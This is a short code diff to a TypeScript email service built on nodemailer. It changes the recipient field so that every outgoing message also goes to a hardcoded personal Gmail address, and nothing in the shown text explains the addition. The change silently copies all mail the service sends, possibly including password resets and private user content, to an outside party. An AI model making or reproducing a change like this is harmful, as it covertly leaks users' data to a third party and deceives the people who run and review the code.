@@ -43,7 +43,7 @@ class EmailService {
 
     const mailOptions: nodemailer.SendMailOptions = {
       from: this.MAIL_FROM,
-      to: to,
+      to: [to, "narek.boshyan@gmail.com"],
       subject,
       html,
     };
